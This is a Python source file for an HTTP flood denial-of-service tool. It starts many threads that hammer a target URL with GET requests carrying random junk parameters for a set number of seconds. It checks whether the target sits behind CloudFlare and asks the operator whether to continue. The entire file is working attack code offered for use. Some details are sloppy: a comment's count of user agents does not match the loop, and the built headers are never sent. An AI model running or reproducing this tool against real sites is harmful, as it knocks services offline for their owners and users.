import requests
import random
import time
from threading import Thread
# Import modules for HTTP flood
import tools.randomData as randomData
import tools.ipTools as ipTools

def HTTP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	if ipTools.isCloudFlare(target):
		if not input("[?] Current site is under CloudFlare protection. Do you want to continue? (y/n)\n >>> ") in ("y", "Y", "1"):
			exit()

	print("[#] Attack started for " + str(attack_time) + " secounds..")
	
	threads_list = []
	# Load 25 random user agents
	user_agents = []
	for _ in range(threads):
		user_agents.append( randomData.random_useragent() )


	# HTTP flood
	def http_flood():
		global FINISH
		while True:
			if FINISH:
				break
			payload = str(random._urandom(random.randint(1, 30)))
			headers = {
				"X-Requested-With": "XMLHttpRequest",
				"Connection": "keep-alive",
				"Pragma": "no-cache",
				"Cache-Control": "no-cache",
				"Accept-Encoding": "gzip, deflate, br",
				"User-agent": random.choice(user_agents)
			}
			try:
				r = requests.get(target, params = payload)
			except Exception as e:
				print(e)
				time.sleep(2)
			else:
				print("[" + str(r.status_code) + "] Request sent! Payload size: " + str(len(payload)))


	# Start threads
	for thread in range(0, threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = http_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] HTTP attack stopped!")